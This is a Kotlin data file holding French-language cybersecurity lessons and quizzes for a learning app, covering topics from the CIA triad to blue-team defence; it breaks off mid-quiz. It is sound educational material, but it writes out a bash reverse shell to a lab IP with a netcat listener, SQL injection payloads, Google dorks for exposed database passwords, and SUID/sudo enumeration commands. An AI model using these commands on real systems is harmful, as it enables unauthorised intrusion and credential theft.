package com.example.data.generator

import com.example.data.model.CyberLesson
import com.example.data.model.CyberLevel
import com.example.data.model.LessonSection
import com.example.data.model.QuizQuestion

object CyberLessonsData {

    val lessons: List<CyberLesson> = listOf(
        // =========================================================================
        // LEÇON 1 : INTRODUCTION À LA CYBERSÉCURITÉ & TRIADE CIA
        // =========================================================================
        CyberLesson(
            id = "sec_01_intro",
            number = 1,
            title = "1. Introduction à la Cybersécurité & Triade CIA",
            subtitle = "Principes fondamentaux, hackers White/Black Hat et la règle d'or CIA",
            level = CyberLevel.FONDATIONS,
            durationMinutes = 8,
            xpReward = 60,
            summary = "Comprenez les fondements de la sécurité informatique, le cadre éthique légal et la triade universelle Confidentialité - Intégrité - Disponibilité.",
            sections = listOf(
                LessonSection(
                    title = "1. Qu'est-ce que la Cybersécurité ?",
                    content = """
La cybersécurité est la pratique consistant à protéger les ordinateurs, serveurs, téléphones, réseaux et données contre les attaques malveillantes.

Dans le monde du hacking, on distingue plusieurs catégories d'acteurs :
• **White Hat (Hackers Éthiques)** : Des experts en sécurité qui utilisent leurs compétences pour identifier et corriger les vulnérabilités avec l'autorisation préalable des cibles (Tests d'intrusion / Pentest, Bug Bounty).
• **Black Hat (Cybercriminels)** : Des pirates qui exploitent les failles pour voler des données, extorquer des rançons (Ransomware) ou détruire des systèmes.
• **Grey Hat** : Des chercheurs qui découvrent des failles sans autorisation malveillante mais sans mandat officiel.
                    """.trimIndent(),
                    tip = "En droit international et sous la loi française/européenne (Code Pénal art. 323-1), sonder ou accéder à un système sans autorisation écrite explicite est un délit passible de prison ferme. Ne testez jamais vos outils sur des cibles non autorisées !"
                ),
                LessonSection(
                    title = "2. La Triade CIA (Le Pilier Universel)",
                    content = """
Tout professionnel de la sécurité fonde ses décisions sur la triade **CIA** :

1. **C - Confidentialité** : Garantir que seules les personnes autorisées ont accès aux informations sensibles.
   *Exemple de menace :* Fuite de données, interception de mots de passe sur le Wi-Fi public.
   *Défense :* Chiffrement fort (AES, TLS), contrôle d'accès rigoureux.

2. **I - Intégrité** : Garantir que les données sont exactes, fiables et n'ont pas été modifiées ou altérées en cachette.
   *Exemple de menace :* Un attaquant modifie le montant d'un virement bancaire pendant la transmission.
   *Défense :* Hachage cryptographique (SHA-256), signatures numériques.

3. **A - Disponibilité (Availability)** : Garantir que les systèmes et données sont accessibles quand les utilisateurs légitimes en ont besoin.
   *Exemple de menace :* Attaque par déni de service distribué (DDoS) qui sature un site web.
   *Défense :* Redondance, pare-feu anti-DDoS, répartiteurs de charge.
                    """.trimIndent()
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_01_1",
                    question = "Que signifie la lettre 'I' dans la triade fondamentale de la sécurité 'CIA' ?",
                    codeSnippet = null,
                    options = listOf(
                        "Identification",
                        "Intégrité (garantie que les données n'ont pas été altérées)",
                        "Isolation",
                        "Interception"
                    ),
                    correctIndex = 1,
                    explanation = "La triade CIA regroupe Confidentialité, Intégrité et Disponibilité (Availability). L'intégrité assure que la donnée n'a subi aucune modification illicite."
                ),
                QuizQuestion(
                    id = "q_sec_01_2",
                    question = "Quelle est la définition d'un hacker 'White Hat' ?",
                    codeSnippet = null,
                    options = listOf(
                        "Un pirate qui attaque uniquement les gouvernements",
                        "Un expert qui hacke avec accord écrit pour renforcer la sécurité",
                        "Un créateur de virus indétectables",
                        "Un administrateur réseau sans compétences en sécurité"
                    ),
                    correctIndex = 1,
                    explanation = "Les White Hats sont des hackers éthiques opérant dans la stricte légalité avec l'accord formel du propriétaire du système ciblé."
                )
            )
        ),

        // =========================================================================
        // LEÇON 2 : RÉSEAUX & MODÈLE OSI POUR PENTESTERS
        // =========================================================================
        CyberLesson(
            id = "sec_02_osi_tcp",
            number = 2,
            title = "2. Réseaux & Modèle OSI pour Penthunters",
            subtitle = "Les 7 couches OSI, TCP vs UDP, ports critiques (22, 80, 443, 3389)",
            level = CyberLevel.FONDATIONS,
            durationMinutes = 10,
            xpReward = 70,
            summary = "Maîtrisez les rouages des réseaux informatiques : paquets, connexions three-way handshake et ports réseau incontournables.",
            sections = listOf(
                LessonSection(
                    title = "1. Les 7 Couches du Modèle OSI",
                    content = """
Pour comprendre où frappe une cyberattaque, il faut visualiser le voyage d'un paquet de données à travers les 7 couches du modèle OSI :
7. **Application** (HTTP, DNS, SSH, FTP) -> Cible des attaques web (SQLi, XSS).
6. **Présentation** (SSL/TLS, formatage de données).
5. **Session** (Gestion des connexions).
4. **Transport** (TCP, UDP) -> Gestion des ports et segments de transport.
3. **Réseau** (IP, ICMP) -> Routage des paquets sur Internet (IP Spoofing, Ping).
2. **Liaison de données** (Ethernet, Adresses MAC, ARP) -> Cible du spoofing ARP.
1. **Physique** (Câbles, Wi-Fi, signaux radio).
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. TCP vs UDP & Le Three-Way Handshake",
                    content = """
• **TCP (Transmission Control Protocol)** : Fiable et connecté. Chaque paquet reçu est acquitté.
  Avant d'échanger des données, TCP négocie la connexion via le **Three-Way Handshake** (La poignée de main à 3 temps) :
  1. Le client envoie un paquet **SYN** (Synchronize).
  2. Le serveur répond par **SYN-ACK** (Synchronize-Acknowledge).
  3. Le client confirme avec **ACK** (Acknowledge). La connexion est établie !
• **UDP (User Datagram Protocol)** : Sans connexion préalable, rapide mais sans garantie de livraison (idéal pour le streaming, DNS, VoIP).

Les ports réseau standards à connaître par cœur :
• Port 22 : SSH (Accès terminal sécurisé)
• Port 21 : FTP (Transfert de fichiers non chiffré)
• Port 53 : DNS (Résolution de noms de domaine)
• Port 80 : HTTP (Web non sécurisé en clair)
• Port 443 : HTTPS (Web chiffré TLS)
• Port 3389 : RDP (Bureau à distance Windows)
                    """.trimIndent(),
                    tip = "Une attaque de type SYN Flood sature la mémoire d'un serveur en envoyant des millions de paquets SYN sans jamais renvoyer le dernier ACK !"
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_02_1",
                    question = "Quel est l'ordre exact du 'Three-Way Handshake' en protocole TCP ?",
                    codeSnippet = null,
                    options = listOf(
                        "ACK -> SYN -> FIN",
                        "SYN -> SYN-ACK -> ACK",
                        "CONNECT -> ACCEPT -> READY",
                        "PING -> PONG -> OK"
                    ),
                    correctIndex = 1,
                    explanation = "Le client envoie SYN, le serveur répond avec SYN-ACK, et le client finalise avec ACK avant de transmettre les données utiles."
                ),
                QuizQuestion(
                    id = "q_sec_02_2",
                    question = "Quel port standard est utilisé par le protocole SSH pour l'administration distante chiffrée ?",
                    codeSnippet = null,
                    options = listOf("Port 80", "Port 21", "Port 22", "Port 443"),
                    correctIndex = 2,
                    explanation = "Le port standard universel pour SSH (Secure Shell) est le port 22."
                )
            )
        ),

        // =========================================================================
        // LEÇON 3 : CRYPTOGRAPHIE MODERNE & HASHING
        // =========================================================================
        CyberLesson(
            id = "sec_03_crypto",
            number = 3,
            title = "3. Cryptographie & Hachage : AES, RSA & SHA",
            subtitle = "Chiffrement symétrique vs asymétrique, clés publiques/privées et salage",
            level = CyberLevel.FONDATIONS,
            durationMinutes = 10,
            xpReward = 75,
            summary = "Distinguez sans ambiguïté le chiffrement (réversible) du hachage (à sens unique) et découvrez comment les mots de passe sont protégés avec le sel.",
            sections = listOf(
                LessonSection(
                    title = "1. Chiffrement Symétrique vs Asymétrique",
                    content = """
Le **Chiffrement** transforme un texte clair en charabia illisible grâce à une clé mathématique :
• **Symétrique (ex: AES-256)** : La MÊME clé secrète sert à la fois à chiffrer et à déchiffrer. C'est ultra-rapide mais pose le problème de comment transmettre la clé en sécurité.
• **Asymétrique (ex: RSA, ECC)** : Utilise une PAIRE de clés :
  - La **Clé Publique** : distribuée à tout le monde, elle sert uniquement à chiffrer.
  - La **Clé Privée** : gardée secrète par son propriétaire, elle seule peut déchiffrer !
C'est le mécanisme fondateur du protocole HTTPS et des certificats SSL/TLS.
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. Le Hachage (Hash) et le Salage (Salt)",
                    content = """
Une fonction de **Hachage** (ex: SHA-256, bcrypt) est une fonction mathématique à **SENS UNIQUE STRICT** :
Elle prend une donnée de n'importe quelle taille et produit une empreinte de longueur fixe (digest).
On ne peut PAS « déhacher » un hash pour retrouver le mot de passe d'origine !

Le **Salage (Salt)** :
Si deux utilisateurs ont le même mot de passe 'secret123', ils auraient le même hash dans la base de données.
Un pirate pourrait utiliser des tables précalculées (Rainbow Tables) pour les retrouver en 1 seconde.
Pour contrer cela, on ajoute une chaîne aléatoire unique appelée « Sel » au mot de passe avant de le hacher :
`hash = SHA256(mot_de_passe + sel_aleatoire)`
                    """.trimIndent(),
                    codeSnippet = """
# Exemple conceptuel de hachage sécurisé :
# Mot de passe : "Azerty123"
# Sel unique généré : "x9!kP7_vL"
# Valeur hachée : bcrypt("$2a$12$...")
# Résultat : Impossible à casser avec des Rainbow Tables !
                    """.trimIndent(),
                    warning = "MD5 et SHA-1 sont considérés comme obsolètes et dangereux car des collisions ont été démontrées. Utilisez bcrypt, Argon2 ou PBKDF2 pour stocker des mots de passe !"
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_03_1",
                    question = "Peut-on mathématiquement 'déchiffrer' une empreinte issue d'un algorithme de hachage comme SHA-256 ?",
                    codeSnippet = null,
                    options = listOf(
                        "Oui, avec la clé secrète",
                        "Non, le hachage est une fonction mathématique à sens unique strict",
                        "Oui, si on utilise un navigateur web",
                        "Uniquement la nuit"
                    ),
                    correctIndex = 1,
                    explanation = "Le hachage n'est pas du chiffrement : il est conçu pour être irréversible. On ne peut vérifier un mot de passe qu'en re-hachant la saisie et en comparant les empreintes."
                ),
                QuizQuestion(
                    id = "q_sec_03_2",
                    question = "À quoi sert le 'Salage' (Salt) lors de l'enregistrement d'un mot de passe ?",
                    codeSnippet = null,
                    options = listOf(
                        "À compresser la taille de la base de données",
                        "À ajouter des caractères aléatoires uniques pour rendre inefficaces les attaques par tables arc-en-ciel (Rainbow Tables)",
                        "À rendre le mot de passe plus facile à retenir pour l'utilisateur",
                        "À envoyer le mot de passe par email"
                    ),
                    correctIndex = 1,
                    explanation = "Le sel empêche l'utilisation de dictionnaires pré-calculés et garantit que deux mots de passe identiques auront des empreintes différentes."
                )
            )
        ),

        // =========================================================================
        // LEÇON 4 : SÉCURITÉ WEB - INJECTIONS SQL (SQLi)
        // =========================================================================
        CyberLesson(
            id = "sec_04_sqli",
            number = 4,
            title = "4. Sécurité Web : Injections SQL (SQLi) & Défense",
            subtitle = "Failles d'authentification, ' OR 1=1 --, extraction de bases et requêtes préparées",
            level = CyberLevel.WEB_OWASP,
            durationMinutes = 11,
            xpReward = 85,
            summary = "Analysez la vulnérabilité web la plus célèbre au monde : comment elle permet de voler des bases de données et comment s'en prémunir avec les requêtes préparées.",
            sections = listOf(
                LessonSection(
                    title = "1. Comment fonctionne une Injection SQL ?",
                    content = """
Une injection SQL survient lorsqu'une application prend du texte saisi par un utilisateur et le colle directement dans une requête SQL sans le filtrer ni le sécuriser.

Exemple de code vulnérable côté serveur :
`sql = "SELECT * FROM users WHERE pseudo = '" + saisie_utilisateur + "' AND pass = '" + mot_de_passe + "'"`

Si un attaquant tape dans le champ pseudo :
`admin' --`
La requête exécutée par la base de données devient :
`SELECT * FROM users WHERE pseudo = 'admin' --' AND pass = '...'`
Le symbole `--` transforme tout le reste de la requête en commentaire !
Résultat : La vérification du mot de passe est ignorée et l'attaquant est connecté en tant qu'administrateur !
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. La Défense Absolue : Les Requêtes Préparées (Prepared Statements)",
                    content = """
Pour éliminer 100% des injections SQL, vous ne devez **JAMAIS concaténer** du texte utilisateur dans une requête SQL.
Utilisez des **Requêtes Préparées avec Paramètres Liés** (Parameterized Queries).
Le moteur de base de données compile d'abord la structure de la requête, puis injecte la saisie utilisateur strictement en tant que valeur littérale, jamais en tant que code exécutable !
                    """.trimIndent(),
                    codeSnippet = """
# Code sécurisé en Python (avec sqlite3 ou PostgreSQL) :
curseur.execute(
    "SELECT * FROM utilisateurs WHERE pseudo = ? AND pass = ?",
    (pseudo_utilisateur, hash_mot_de_passe) # Paramètres liés séparés
)
# Même si l'attaquant tape ' OR 1=1 --, cela est traité comme une simple chaîne inoffensive !
                    """.trimIndent(),
                    tip = "L'outil open-source 'sqlmap' est couramment utilisé par les pentesters pour tester automatiquement si une URL ou un formulaire est vulnérable à des injections SQL."
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_04_1",
                    question = "Quel rôle joue le symbole '--' dans une injection SQL ?",
                    codeSnippet = "SELECT * FROM users WHERE user = 'admin' --' AND pass = 'abc'",
                    options = listOf(
                        "Il soustrait deux nombres",
                        "Il commente le reste de la requête SQL, désactivant la vérification du mot de passe",
                        "Il supprime la table utilisateurs",
                        "Il redémarre le serveur"
                    ),
                    correctIndex = 1,
                    explanation = "En SQL, -- marque le début d'un commentaire. Le serveur ignore toute la suite de la ligne, y compris le contrôle de mot de passe."
                ),
                QuizQuestion(
                    id = "q_sec_04_2",
                    question = "Quelle est la meilleure pratique pour éliminer définitivement les failles SQL Injection ?",
                    codeSnippet = null,
                    options = listOf(
                        "Changer les mots de passe tous les jours",
                        "Utiliser des requêtes préparées avec paramètres liés (Prepared Statements)",
                        "Désactiver la base de données",
                        "Masquer l'adresse IP du serveur"
                    ),
                    correctIndex = 1,
                    explanation = "Les requêtes préparées séparent rigoureusement le code SQL des données utilisateurs, rendant toute altération de la logique SQL impossible."
                )
            )
        ),

        // =========================================================================
        // LEÇON 5 : SÉCURITÉ WEB - XSS & CSRF
        // =========================================================================
        CyberLesson(
            id = "sec_05_xss_csrf",
            number = 5,
            title = "5. Failles Web : XSS, CSRF & Vol de Session",
            subtitle = "Cross-Site Scripting réfléchi/stocké, vol de cookies document.cookie et tokens anti-CSRF",
            level = CyberLevel.WEB_OWASP,
            durationMinutes = 11,
            xpReward = 85,
            summary = "Découvrez comment des scripts malveillants JavaScript peuvent être exécutés dans le navigateur des victimes et comment protéger les cookies avec HttpOnly.",
            sections = listOf(
                LessonSection(
                    title = "1. Le Cross-Site Scripting (XSS)",
                    content = """
Une faille **XSS** permet à un pirate d'injecter du code JavaScript malveillant dans une page web consultée par d'autres utilisateurs.

Types de XSS :
1. **XSS Stocké (Stored)** : Le pirate poste un commentaire contenant `<script>voler_cookies()</script>`. Chaque visiteur qui ouvre la page exécute le script à son insu !
2. **XSS Réfléchi (Reflected)** : Le script est injecté via un paramètre d'URL piégé (ex: `https://site.com/search?q=<script>...`).
3. **DOM XSS** : La faille est exécutée directement par le JavaScript côté client.

Conséquence : Le pirate peut lire `document.cookie`, voler le jeton de session de l'administrateur et usurper son identité sans connaître son mot de passe !
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. La Défense : Échappement HTML & Flag HttpOnly",
                    content = """
Pour contrer le XSS :
• **Échappement automatique (HTML Encoding)** : Remplacer systématiquement `<` par `&lt;` et `>` par `&gt;`. Le navigateur affichera le texte sans l'exécuter comme du code.
• **Flag HttpOnly sur les cookies** : Interdit formellement au code JavaScript d'accéder au cookie de session ! Même en cas de faille XSS, le cookie reste intouchable.
• **CSP (Content Security Policy)** : En-tête HTTP qui interdit l'exécution de scripts inline non autorisés.
                    """.trimIndent(),
                    tip = "Le flag 'SameSite=Strict' sur les cookies protège également contre les attaques CSRF (Cross-Site Request Forgery)."
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_05_1",
                    question = "Quel est le but principal d'une attaque XSS (Cross-Site Scripting) ?",
                    codeSnippet = null,
                    options = listOf(
                        "Détruire physiquement le disque dur du serveur",
                        "Exécuter du JavaScript malveillant dans le navigateur de la victime",
                        "Interrompre la connexion électrique",
                        "Chiffrer le BIOS de l'ordinateur"
                    ),
                    correctIndex = 1,
                    explanation = "Le XSS vise à faire exécuter du code JavaScript non approuvé dans le contexte du navigateur d'un utilisateur pour dérober sa session ou manipuler la page."
                ),
                QuizQuestion(
                    id = "q_sec_05_2",
                    question = "Quel drapeau de cookie empêche le JavaScript de lire document.cookie ?",
                    codeSnippet = null,
                    options = listOf("Secure", "HttpOnly", "NoScript", "SessionLock"),
                    correctIndex = 1,
                    explanation = "Le flag 'HttpOnly' bloque l'accès aux cookies via les APIs du navigateur (comme document.cookie), neutralisant le vol de session par XSS."
                )
            )
        ),

        // =========================================================================
        // LEÇON 6 : RECONNAISSANCE, OSINT & SCAN AVEC NMAP
        // =========================================================================
        CyberLesson(
            id = "sec_06_nmap_recon",
            number = 6,
            title = "6. Hacking Éthique : OSINT & Scan Réseau avec Nmap",
            subtitle = "Recherche passive, Google Dorks, cartographie et commandes Nmap indispensables",
            level = CyberLevel.RECON_SCAN,
            durationMinutes = 12,
            xpReward = 90,
            summary = "Apprenez la première étape cruciale de tout test d'intrusion : collecter des informations publiques (OSINT) et cartographier les services actifs avec Nmap.",
            sections = listOf(
                LessonSection(
                    title = "1. Qu'est-ce que l'OSINT (Reconnaissance Passive) ?",
                    content = """
L'**OSINT (Open Source Intelligence)** est l'art de collecter des informations stratégiques en utilisant uniquement des sources publiques légitimes, sans jamais toucher directement la cible :
• Registres WHOIS et DNS (découvrir les sous-domaines cachés).
• **Google Dorking** : Utiliser des opérateurs de recherche avancés pour dénicher des documents confidentiels ou panneaux d'administration exposés :
  - `filetype:pdf "confidentiel"`
  - `site:cible.com inurl:admin`
  - `site:cible.com ext:env "DB_PASSWORD"`
• **Shodan** : Le moteur de recherche des objets connectés et serveurs exposés sur le web mondial.
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. Nmap : Le Couteau Suisse de l'Analyse Réseau",
                    content = """
Une fois l'autorisation de test obtenue, on passe à la reconnaissance active avec **Nmap** (Network Mapper).
Commandes Nmap fondamentales à maîtriser :
• `nmap -sS cible.com` : **SYN Stealth Scan** (rapide, ne finalise pas le 3-way handshake pour rester discret).
• `nmap -sV cible.com` : Détecte la **version exacte** des logiciels qui tournent sur chaque port (crucial pour trouver les failles de version !).
• `nmap -O cible.com` : Détecte le système d'exploitation (Linux, Windows).
• `nmap -p- cible.com` : Scanne les 65 535 ports complets (au lieu des 1 000 ports par défaut).
• `nmap --script vuln cible.com` : Exécute le moteur de scripts NSE pour repérer automatiquement des vulnérabilités connues.
                    """.trimIndent(),
                    codeSnippet = """
# Exemple d'analyse complète recommandée par les professionnels :
nmap -sC -sV -p 22,80,443 -oN rapport_scan.txt 192.168.1.50
# -sC : lance les scripts de diagnostic par défaut
# -sV : identifie les versions exactes des services
# -oN : enregistre le rapport dans un fichier texte lisible
                    """.trimIndent()
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_06_1",
                    question = "Quel est l'avantage du scan Nmap avec l'option -sS (SYN Scan) ?",
                    codeSnippet = null,
                    options = listOf(
                        "Il crypte le réseau",
                        "Il est discret et rapide car il ne termine pas la connexion TCP complète (semi-ouvert)",
                        "Il vole automatiquement les mots de passe",
                        "Il contourne tous les mots de passe root"
                    ),
                    correctIndex = 1,
                    explanation = "Le SYN scan (-sS) n'envoie jamais le dernier ACK. Les anciens pare-feu ne journalisaient pas les connexions non finalisées."
                ),
                QuizQuestion(
                    id = "q_sec_06_2",
                    question = "Que permet de découvrir l'option Nmap '-sV' ?",
                    codeSnippet = null,
                    options = listOf(
                        "La vitesse de connexion en Mbps",
                        "Les versions exactes des services et logiciels écoutant sur les ports ouverts",
                        "Le numéro de carte bancaire du propriétaire",
                        "La météo du serveur"
                    ),
                    correctIndex = 1,
                    explanation = "-sV (Service Version) interroge les bannières pour déterminer avec précision le nom et la version du serveur web, SSH ou base de données."
                )
            )
        ),

        // =========================================================================
        // LEÇON 7 : ANALYSE DE PAQUETS AVEC WIRESHARK
        // =========================================================================
        CyberLesson(
            id = "sec_07_wireshark",
            number = 7,
            title = "7. Analyse de Trafic Réseau avec Wireshark",
            subtitle = "Capture de paquets en temps réel, filtres d'affichage et détection de fuites de données",
            level = CyberLevel.RECON_SCAN,
            durationMinutes = 11,
            xpReward = 90,
            summary = "Inspectez ce qui transite réellement sur un câble ou une onde Wi-Fi grâce à l'analyseur de paquets Wireshark et comprenez pourquoi le chiffrement TLS est vital.",
            sections = listOf(
                LessonSection(
                    title = "1. Les Fondations de Wireshark",
                    content = """
**Wireshark** est le sniffer de paquets le plus réputé au monde.
Il place la carte réseau en mode promiscuité (*promiscuous mode*) pour capturer tous les paquets transitant sur le segment local.

Pourquoi le protocole HTTP non chiffré est-il mortel ?
Sur un protocole non chiffré (HTTP, Telnet, FTP), n'importe qui sur le même réseau local (ex: Wi-Fi d'aéroport) peut ouvrir Wireshark et lire les identifiants, mots de passe et messages texte en clair !
Avec HTTPS (TLS), le contenu des paquets est indéchiffrable.
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. Filtres Wireshark Essentiels",
                    content = """
Face à des millions de paquets par minute, les filtres d'affichage permettent d'isoler l'aiguille dans la botte de foin :
• `ip.addr == 192.168.1.1` : isole le trafic d'une machine spécifique.
• `http.request.method == "POST"` : trouve instantanément les soumissions de formulaires et de mots de passe.
• `tcp.port == 80` : isole le trafic HTTP.
• `dns` : filtre les requêtes de résolution de noms.
• Fonction **« Follow TCP Stream »** : Reconstitue en un clic l'intégralité d'une conversation entre client et serveur sous forme lisible !
                    """.trimIndent(),
                    tip = "L'attaque ARP Spoofing (ou Man-In-The-Middle) trompe les machines d'un réseau local pour router tout leur trafic à travers la machine de l'attaquant avant la box Internet."
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_07_1",
                    question = "Que peut voir un attaquant qui capture le trafic d'une connexion HTTP classique (non chiffrée) avec Wireshark ?",
                    codeSnippet = null,
                    options = listOf(
                        "Uniquement des blocs cryptés indéchiffrables",
                        "L'intégralité des données en texte clair, y compris les mots de passe saisis",
                        "Uniquement la date et l'heure",
                        "Rien car Wireshark est payant"
                    ),
                    correctIndex = 1,
                    explanation = "Le protocole HTTP transmet les données en clair sur le réseau. N'importe quel analyseur comme Wireshark peut lire les formulaires et identifiants bruts."
                )
            )
        ),

        // =========================================================================
        // LEÇON 8 : VULNÉRABILITÉS & REVERSE SHELLS
        // =========================================================================
        CyberLesson(
            id = "sec_08_reverse_shell",
            number = 8,
            title = "8. Exploitation Système : CVEs & Reverse Shells",
            subtitle = "Bases de vulnérabilités, Bind Shell vs Reverse Shell et écouteur Netcat",
            level = CyberLevel.EXPLOITATION,
            durationMinutes = 12,
            xpReward = 100,
            summary = "Découvrez le concept d'un exploit de sécurité, la différence cruciale entre Bind et Reverse Shell, et le rôle de l'outil Netcat.",
            sections = listOf(
                LessonSection(
                    title = "1. Qu'est-ce qu'une CVE et un Exploit ?",
                    content = """
• **CVE (Common Vulnerabilities and Exposures)** : Référence internationale unique pour chaque faille découverte (ex: `CVE-2021-44228` pour la célèbre faille Log4Shell).
• **Score CVSS (0 à 10)** : Mesure la sévérité d'une vulnérabilité (une faille 9.8 est critique et permet souvent une exécution de code à distance sans authentification).
• **Exploit** : Le script ou programme qui tire parti de la faille pour forcer le système à exécuter les ordres de l'attaquant.
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. Bind Shell vs Reverse Shell",
                    content = """
Quand un pentester réussit à exploiter un serveur distant, il veut obtenir un terminal (un shell) :

• **Bind Shell** : Le serveur cible ouvre un port (ex: 4444) et attend que le pentester s'y connecte.
  *Problème :* Dans 99% des cas, le pare-feu du serveur bloque les connexions entrantes sur les ports inhabituels !

• **Reverse Shell (La norme en pentest)** : C'est la MACHINE CIBLE qui INITIE la connexion sortante vers la machine du pentester !
  Comme les pare-feu autorisent généralement le trafic sortant (vers le web), la connexion traverse le pare-feu sans être bloquée !
                    """.trimIndent(),
                    codeSnippet = """
# Sur la machine de l'analyste (Attaquant / Pentester) :
# Netcat écoute sur le port 4444 :
nc -lvnp 4444

# Sur la machine cible (une fois la faille exploitée) :
# La cible se connecte en retour et livre son terminal bash :
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
                    """.trimIndent()
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_08_1",
                    question = "Pourquoi les hackers éthiques privilégient-ils un 'Reverse Shell' plutôt qu'un 'Bind Shell' ?",
                    codeSnippet = null,
                    options = listOf(
                        "Parce que le Reverse Shell est plus coloré",
                        "Parce que les pare-feu bloquent les connexions entrantes mais laissent passer les connexions sortantes initiées par la cible",
                        "Parce que le Bind Shell nécessite un câble USB",
                        "Parce que le Reverse Shell supprime Windows"
                    ),
                    correctIndex = 1,
                    explanation = "La majorité des pare-feux et routeurs bloquent les ports entrants arbitraires, mais autorisent les connexions sortantes vers Internet."
                )
            )
        ),

        // =========================================================================
        // LEÇON 9 : ÉLÉVATION DE PRIVILÈGES (PRIVESC)
        // =========================================================================
        CyberLesson(
            id = "sec_09_privesc",
            number = 9,
            title = "9. Élévation de Privilèges : Linux & Windows (PrivEsc)",
            subtitle = "Devenir root / SYSTEM, binaires SUID, sudo mal configuré et faiblesses de droits",
            level = CyberLevel.EXPLOITATION,
            durationMinutes = 12,
            xpReward = 100,
            summary = "Découvrez comment un attaquant qui a pris pied avec un compte restreint parvient à obtenir les droits suprêmes (root sur Linux ou SYSTEM sur Windows).",
            sections = listOf(
                LessonSection(
                    title = "1. Le Concept de Privilege Escalation",
                    content = """
Lorsqu'un exploit réussit sur un serveur web, l'attaquant n'obtient généralement qu'un accès avec des droits très limités (par exemple l'utilisateur `www-data` sous Linux).
Il ne peut ni lire les mots de passe des autres utilisateurs, ni modifier les fichiers système.

L'**Élévation de Privilèges** (PrivEsc) consiste à trouver une faiblesse de configuration, un script mal sécurisé ou une faille du noyau pour passer d'utilisateur standard à administrateur suprême :
• **root** sous Linux.
• **NT AUTHORITY\SYSTEM** sous Windows.
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. Vecteurs Communs sous Linux",
                    content = """
• **Droits sudo mal configurés** : Si `sudo -l` indique qu'un utilisateur a le droit de lancer `/usr/bin/find` ou `vim` avec les droits root sans mot de passe, l'attaquant peut s'en servir pour spawn un shell root immédiat (référencé sur GTFOBins) !
• **Binaires SUID (Set User ID)** : Fichiers exécutables qui s'exécutent avec les privilèges de leur propriétaire (root), peu importe qui les lance (`find / -perm -u=s -type f 2>/dev/null`).
• **Tâches planifiées (Cron jobs)** : Un script lancé par root toutes les 5 minutes dont les permissions d'écriture ont été laissées ouvertes à tout le monde.
                    """.trimIndent(),
                    codeSnippet = """
# Exemple de commande d'audit sous Linux :
sudo -l # Liste les privilèges sudo attribués à l'utilisateur courant
# Trouver les fichiers SUID potentiellement exploitables :
find / -perm -4000 -type f 2>/dev/null
                    """.trimIndent()
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_09_1",
                    question = "Quel est l'objectif de l'étape d'élévation de privilèges (Privilege Escalation) ?",
                    codeSnippet = null,
                    options = listOf(
                        "Augmenter la vitesse du processeur",
                        "Passer d'un compte utilisateur restreint aux droits administrateur suprême (root/SYSTEM)",
                        "Éteindre l'écran de la cible",
                        "Installer une nouvelle imprimante"
                    ),
                    correctIndex = 1,
                    explanation = "PrivEsc permet à un attaquant qui dispose d'un accès limité de s'élever jusqu'au contrôle total de la machine."
                )
            )
        ),

        // =========================================================================
        // LEÇON 10 : BLUE TEAMING, SOC & DEFENSE EN PROFONDEUR
        // =========================================================================
        CyberLesson(
            id = "sec_10_blue_team",
            number = 10,
            title = "10. Défense & Blue Team : Pare-feu, SIEM & SOC",
            subtitle = "Détection d'intrusions, analyse de logs, principe du moindre privilège et durcissement",
            level = CyberLevel.DEFENSE_SOC,
            durationMinutes = 12,
            xpReward = 110,
            summary = "Passez du côté des défenseurs : apprenez comment les équipes Blue Team et les analystes SOC surveillent les réseaux et neutralisent les attaques.",
            sections = listOf(
                LessonSection(
                    title = "1. Le Rôle du SOC et des SIEM",
                    content = """
Un **SOC (Security Operations Center)** est une salle de contrôle où des analystes surveillent en continu la sécurité du réseau d'une entreprise.

Leur outil central est le **SIEM (Security Information and Event Management)** :
Il centralise et corrèle des millions de journaux d'événements (logs) provenant des pare-feux, serveurs, routeurs et postes de travail :
• Si 50 échecs de connexion surviennent en 3 secondes sur un serveur SSH suivis d'un succès -> Alerte automatique de Brute-Force !
• Si un compte employé se connecte depuis Paris à 14h00 et depuis Tokyo à 14h05 -> Alerte de voyage impossible (*Impossible Travel*) !
                    """.trimIndent()
                ),
                LessonSection(
                    title = "2. La Défense en Profondeur (Defense in Depth)",
                    content = """
La règle d'or de la cybersécurité moderne est de **ne jamais faire confiance à une seule barrière**.
On empile plusieurs couches protectrices :
1. **Périmètre** : Pare-feu (Firewall), WAF (Web Application Firewall), protection anti-DDoS.
2. **Réseau** : Segmentation en VLANs (isoler les serveurs sensibles des postes bureautiques), IDS/IPS (Suricata, Snort).
3. **Postes de travail (Endpoints)** : Antivirus EDR (Endpoint Detection and Response), mises à jour régulières des correctifs de sécurité (Patch Management).
4. **Utilisateurs** : Authentification Multi-Facteurs (**MFA / 2FA**), principe du moindre privilège (personne n'est admin par défaut).
                    """.trimIndent(),
                    tip = "L'activation du MFA (authentification à double facteur via application d'authentification ou clé FIDO2) bloque plus de 99.9% des attaques automatisées sur les comptes !"
                )
            ),
            quiz = listOf(
                QuizQuestion(
                    id = "q_sec_10_1",
                    question = "Quel est le rôle principal d'un SIEM dans un centre de sécurité (SOC) ?",
                    codeSnippet = null,
                    options = listOf(
                        "Créer des virus informatiques",
                        "Centraliser et corréler les logs de multiples équipements pour détecter des activités suspectes en temps réel",
                        "Remplacer les développeurs par une IA",
                        "Changer la couleur du terminal"
                    ),
                    correctIndex = 1,
                    explanation = "Le SIEM centralise les flux de logs et applique des règles de corrélation pour déclencher des alertes de sécurité en temps réel."
                ),
                QuizQuestion(
